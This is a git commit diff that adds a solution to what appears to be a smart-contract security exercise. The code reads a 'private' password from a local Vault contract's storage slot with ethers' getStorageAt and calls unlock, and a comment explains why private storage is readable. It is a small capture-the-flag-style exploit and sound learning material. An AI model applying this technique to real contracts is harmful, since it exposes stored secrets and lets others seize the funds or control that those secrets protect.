460365bd5b68f3cc194fb8b00fa41e509196f905
Yuehan Duan <yuehanduan@Yuehans-MacBook-Pro.local>
2023-01-21 17:48:03 +0100

    Hack Value contract

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -8,6 +8,15 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");
+  /* NOTE: 
+    The getStorageAt() method in Ether.js allows you to access the value of a storage variable 
+    in a smart contract, by passing the contract address and the position of the variable 
+    in the storage trie as arguments. This method doesn't care about the visibility of the variable, 
+    it just access the value of the variable based on the position passed as argument.
+  */
+  const password = provider.getStorageAt(victim.address, 1)
+  await victim.unlock(password);
 };
 
 export default helper;
